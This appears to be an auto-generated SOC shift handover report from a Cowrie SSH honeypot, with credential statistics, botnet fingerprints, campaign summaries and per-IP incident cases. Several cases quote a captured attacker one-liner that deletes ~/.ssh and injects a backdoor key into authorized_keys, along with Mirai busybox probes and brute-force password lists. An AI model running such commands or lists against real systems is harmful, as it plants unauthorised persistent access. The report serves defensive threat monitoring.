# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-20 |
| **Generated At** | 2026-11-20T04:46:50Z |
| **Shift Time** | 04:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **84** |
| Confirmed Threats | **61** |
| False Positives Filtered | **23** (27.4%) |
| Unique Attacker IPs | **56** |
| Countries of Origin | **23** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **37** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **465** |
| Unique Credential Pairs | **383** |
| Unique Usernames | **159** |
| Unique Passwords | **308** |
| Successful Auth Pairs | **416** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 154 |
| `ubuntu` | 44 |
| `rootssssss23424123123` | 18 |
| `admin` | 17 |
| `deploy` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 21 |
| `rootssssss23424123123` | 18 |
| `root3245gs5662d34111111111` | 18 |
| `root` | 10 |
| `admin` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 18 |
| `root` | `root3245gs5662d34111111111` | 16 |
| `root` | `root` | 7 |
| `admin` | `admin` | 7 |
| `support` | `support` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `q7w8e9` | `178.128.72.52` | 2026-11-20T00:00:21 |
| `ubuntu` | `qQwWeE` | `178.128.72.52` | 2026-11-20T00:01:01 |
| `ubuntu` | `qa12` | `178.128.72.52` | 2026-11-20T00:01:41 |
| `ubuntu` | `qaqaqa` | `178.128.72.52` | 2026-11-20T00:02:22 |
| `ubuntu` | `qaswed!@#` | `178.128.72.52` | 2026-11-20T00:03:04 |
| `ubuntu` | `qaz` | `178.128.72.52` | 2026-11-20T00:03:46 |
| `ubuntu` | `qaz!@#` | `178.128.72.52` | 2026-11-20T00:04:29 |
| `ubuntu` | `qaz#@!321` | `178.128.72.52` | 2026-11-20T00:05:10 |
| `ubuntu` | `qaz102030` | `178.128.72.52` | 2026-11-20T00:05:51 |
| `ubuntu` | `qaz123` | `178.128.72.52` | 2026-11-20T00:06:32 |
| `ubuntu` | `qaz1wsx2` | `178.128.72.52` | 2026-11-20T00:07:15 |
| `ubuntu` | `qaz@123` | `178.128.72.52` | 2026-11-20T00:07:58 |
| `ubuntu` | `qaz@WSX` | `178.128.72.52` | 2026-11-20T00:08:40 |
| `ubuntu` | `qaz@wsx#edc` | `178.128.72.52` | 2026-11-20T00:09:23 |
| `ubuntu` | `qazQAZ` | `178.128.72.52` | 2026-11-20T00:10:05 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-11-20T00:10:35 |
| `ubuntu` | `qazedc` | `178.128.72.52` | 2026-11-20T00:10:46 |
| `ubuntu` | `qazqaz` | `178.128.72.52` | 2026-11-20T00:11:29 |
| `root` | `Qw321` | `51.124.186.154` | 2026-11-20T00:11:46 |
| `rootssssss23424123123` | `rootssssss23424123123` | `51.124.186.154` | 2026-11-20T00:11:48 |
_… 396 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **84** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |
| Go SSH scanner | 14 |
| AsyncSSH (Python) | 2 |
| Unknown | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 18 | 9 |
| `7d01d047ace6...` | Mirai/variant | 4 | 4 |
| `16443846184e...` | Generic scanner | 3 | 3 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `d1c5d296d532...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 18 | 9 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 4 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `d1c5d296d532...` | AsyncSSH (Python) | 2 | 1 | Modern SSH client |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 9 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `169.128.70.53`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `51.124.186.154`, `81.192.46.49`, `20.115.209.228`, `150.5.146.193`, `172.56.105.143`, `43.129.44.66`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **56** |
| Unique ASNs | **28** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 23 | HIGH |
| `AS213412` | ONYPHE SAS | 5 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS209334` | Modat B.V. | 1 | HIGH |
| `AS137695` | CHINATELECOM Xinjiang Wulumuqi MAN network | 1 | HIGH |
| `AS4713` | NTT DOCOMO BUSINESS,Inc. | 1 | HIGH |
| `AS22168` | The Shadowserver Foundation, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (38)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2cc4a663d10d

| Field | Detail |
|---|---|
| **Source IP** | `178.128.72[.]52` |
| **First Seen** | 2026-11-20 00:00 |
| **Last Seen** | 2026-11-20 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:00:20` | `cowrie.session.connect` |
| `2026-11-20 00:00:20` | `cowrie.client.version` |
| `2026-11-20 00:00:20` | `cowrie.client.kex` |
| `2026-11-20 00:00:21` | `cowrie.login.success` |
| `2026-11-20 00:00:21` | `cowrie.session.params` |
| `2026-11-20 00:00:21` | `cowrie.command.input` |
| `2026-11-20 00:00:21` | `cowrie.log.closed` |
| `2026-11-20 00:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.72[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.128.72[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ede834f3d3

| Field | Detail |
|---|---|
| **Source IP** | `51.124.186[.]154` |
| **First Seen** | 2026-11-20 00:11 |
| **Last Seen** | 2026-11-20 00:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:11:45` | `cowrie.session.connect` |
| `2026-11-20 00:11:45` | `cowrie.client.version` |
| `2026-11-20 00:11:45` | `cowrie.client.kex` |
| `2026-11-20 00:11:46` | `cowrie.login.success` |
| `2026-11-20 00:11:47` | `cowrie.session.params` |
| `2026-11-20 00:11:47` | `cowrie.command.input` |
| `2026-11-20 00:11:47` | `cowrie.command.failed` |
| `2026-11-20 00:11:47` | `cowrie.log.closed` |
| `2026-11-20 00:11:48` | `cowrie.session.params` |
| `2026-11-20 00:11:48` | `cowrie.command.input` |
| `2026-11-20 00:11:48` | `cowrie.session.file_download` |
| `2026-11-20 00:11:48` | `cowrie.log.closed` |
| `2026-11-20 00:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.124.186[.]154` to AbuseIPDB if not already reported
- [ ] Block `51.124.186[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3d9ea3a7bf

| Field | Detail |
|---|---|
| **Source IP** | `51.124.186[.]154` |
| **First Seen** | 2026-11-20 00:11 |
| **Last Seen** | 2026-11-20 00:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:11:48` | `cowrie.session.connect` |
| `2026-11-20 00:11:48` | `cowrie.client.version` |
| `2026-11-20 00:11:48` | `cowrie.client.kex` |
| `2026-11-20 00:11:48` | `cowrie.login.success` |
| `2026-11-20 00:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.124.186[.]154` to AbuseIPDB if not already reported
- [ ] Block `51.124.186[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b61b5bb26c

| Field | Detail |
|---|---|
| **Source IP** | `14.116.189[.]74` |
| **First Seen** | 2026-11-20 00:11 |
| **Last Seen** | 2026-11-20 00:16 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:11:54` | `cowrie.session.connect` |
| `2026-11-20 00:11:54` | `cowrie.client.version` |
| `2026-11-20 00:11:54` | `cowrie.client.kex` |
| `2026-11-20 00:11:55` | `cowrie.login.success` |
| `2026-11-20 00:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.116.189[.]74` to AbuseIPDB if not already reported
- [ ] Block `14.116.189[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21dec525657c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]252` |
| **First Seen** | 2026-11-20 00:21 |
| **Last Seen** | 2026-11-20 00:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:21:01` | `cowrie.session.connect` |
| `2026-11-20 00:21:02` | `cowrie.login.success` |
| `2026-11-20 00:21:02` | `cowrie.session.params` |
| `2026-11-20 00:21:02` | `cowrie.log.closed` |
| `2026-11-20 00:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b020637be2

| Field | Detail |
|---|---|
| **Source IP** | `103.177.111[.]164` |
| **First Seen** | 2026-11-20 00:29 |
| **Last Seen** | 2026-11-20 00:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:29:48` | `cowrie.session.connect` |
| `2026-11-20 00:29:48` | `cowrie.client.version` |
| `2026-11-20 00:29:49` | `cowrie.client.kex` |
| `2026-11-20 00:29:50` | `cowrie.login.success` |
| `2026-11-20 00:29:51` | `cowrie.session.params` |
| `2026-11-20 00:29:51` | `cowrie.command.input` |
| `2026-11-20 00:29:51` | `cowrie.command.failed` |
| `2026-11-20 00:29:51` | `cowrie.log.closed` |
| `2026-11-20 00:29:52` | `cowrie.session.params` |
| `2026-11-20 00:29:52` | `cowrie.command.input` |
| `2026-11-20 00:29:52` | `cowrie.session.file_download` |
| `2026-11-20 00:29:52` | `cowrie.log.closed` |
| `2026-11-20 00:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.177.111[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.177.111[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3814f01507e0

| Field | Detail |
|---|---|
| **Source IP** | `103.177.111[.]164` |
| **First Seen** | 2026-11-20 00:29 |
| **Last Seen** | 2026-11-20 00:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:29:52` | `cowrie.session.connect` |
| `2026-11-20 00:29:52` | `cowrie.client.version` |
| `2026-11-20 00:29:53` | `cowrie.client.kex` |
| `2026-11-20 00:29:54` | `cowrie.login.success` |
| `2026-11-20 00:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.177.111[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.177.111[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327d94125f5c

| Field | Detail |
|---|---|
| **Source IP** | `169.128.70[.]53` |
| **First Seen** | 2026-11-20 00:36 |
| **Last Seen** | 2026-11-20 00:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:36:11` | `cowrie.session.connect` |
| `2026-11-20 00:36:12` | `cowrie.login.success` |
| `2026-11-20 00:36:12` | `cowrie.session.params` |
| `2026-11-20 00:36:13` | `cowrie.command.input` |
| `2026-11-20 00:36:13` | `cowrie.command.input` |
| `2026-11-20 00:36:14` | `cowrie.command.input` |
| `2026-11-20 00:36:15` | `cowrie.command.input` |
| `2026-11-20 00:36:15` | `cowrie.command.failed` |
| `2026-11-20 00:36:15` | `cowrie.log.closed` |
| `2026-11-20 00:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.128.70[.]53` to AbuseIPDB if not already reported
- [ ] Block `169.128.70[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee0dc2ebe18

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-11-20 00:37 |
| **Last Seen** | 2026-11-20 00:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:37:34` | `cowrie.session.connect` |
| `2026-11-20 00:37:34` | `cowrie.client.version` |
| `2026-11-20 00:37:34` | `cowrie.client.kex` |
| `2026-11-20 00:37:35` | `cowrie.login.success` |
| `2026-11-20 00:37:36` | `cowrie.session.params` |
| `2026-11-20 00:37:36` | `cowrie.command.input` |
| `2026-11-20 00:37:36` | `cowrie.command.failed` |
| `2026-11-20 00:37:37` | `cowrie.log.closed` |
| `2026-11-20 00:37:38` | `cowrie.session.params` |
| `2026-11-20 00:37:38` | `cowrie.command.input` |
| `2026-11-20 00:37:38` | `cowrie.session.file_download` |
| `2026-11-20 00:37:38` | `cowrie.log.closed` |
| `2026-11-20 00:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20511006345e

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-11-20 00:37 |
| **Last Seen** | 2026-11-20 00:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:37:38` | `cowrie.session.connect` |
| `2026-11-20 00:37:38` | `cowrie.client.version` |
| `2026-11-20 00:37:38` | `cowrie.client.kex` |
| `2026-11-20 00:37:39` | `cowrie.login.success` |
| `2026-11-20 00:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86478e471279

| Field | Detail |
|---|---|
| **Source IP** | `20.115.209[.]228` |
| **First Seen** | 2026-11-20 00:44 |
| **Last Seen** | 2026-11-20 00:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:44:14` | `cowrie.session.connect` |
| `2026-11-20 00:44:14` | `cowrie.client.version` |
| `2026-11-20 00:44:14` | `cowrie.client.kex` |
| `2026-11-20 00:44:15` | `cowrie.login.success` |
| `2026-11-20 00:44:15` | `cowrie.session.params` |
| `2026-11-20 00:44:15` | `cowrie.command.input` |
| `2026-11-20 00:44:15` | `cowrie.command.failed` |
| `2026-11-20 00:44:16` | `cowrie.log.closed` |
| `2026-11-20 00:44:16` | `cowrie.session.params` |
| `2026-11-20 00:44:16` | `cowrie.command.input` |
| `2026-11-20 00:44:16` | `cowrie.session.file_download` |
| `2026-11-20 00:44:16` | `cowrie.log.closed` |
| `2026-11-20 00:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.115.209[.]228` to AbuseIPDB if not already reported
- [ ] Block `20.115.209[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b040454f3f

| Field | Detail |
|---|---|
| **Source IP** | `20.115.209[.]228` |
| **First Seen** | 2026-11-20 00:44 |
| **Last Seen** | 2026-11-20 00:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:44:16` | `cowrie.session.connect` |
| `2026-11-20 00:44:16` | `cowrie.client.version` |
| `2026-11-20 00:44:16` | `cowrie.client.kex` |
| `2026-11-20 00:44:17` | `cowrie.login.success` |
| `2026-11-20 00:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.115.209[.]228` to AbuseIPDB if not already reported
- [ ] Block `20.115.209[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc3c851387b

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-11-20 00:44 |
| **Last Seen** | 2026-11-20 00:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:44:52` | `cowrie.session.connect` |
| `2026-11-20 00:44:52` | `cowrie.client.version` |
| `2026-11-20 00:44:52` | `cowrie.client.kex` |
| `2026-11-20 00:44:52` | `cowrie.login.success` |
| `2026-11-20 00:44:53` | `cowrie.session.params` |
| `2026-11-20 00:44:53` | `cowrie.command.input` |
| `2026-11-20 00:44:53` | `cowrie.command.failed` |
| `2026-11-20 00:44:53` | `cowrie.log.closed` |
| `2026-11-20 00:44:54` | `cowrie.session.params` |
| `2026-11-20 00:44:54` | `cowrie.command.input` |
| `2026-11-20 00:44:54` | `cowrie.session.file_download` |
| `2026-11-20 00:44:54` | `cowrie.log.closed` |
| `2026-11-20 00:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059c1f9c2f16

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-11-20 00:44 |
| **Last Seen** | 2026-11-20 00:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-20 00:44:54` | `cowrie.session.connect` |
| `2026-11-20 00:44:54` | `cowrie.client.version` |
| `2026-11-20 00:44:54` | `cowrie.client.kex` |
| `2026-11-20 00:44:55` | `cowrie.login.success` |
| `2026-11-20 00:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

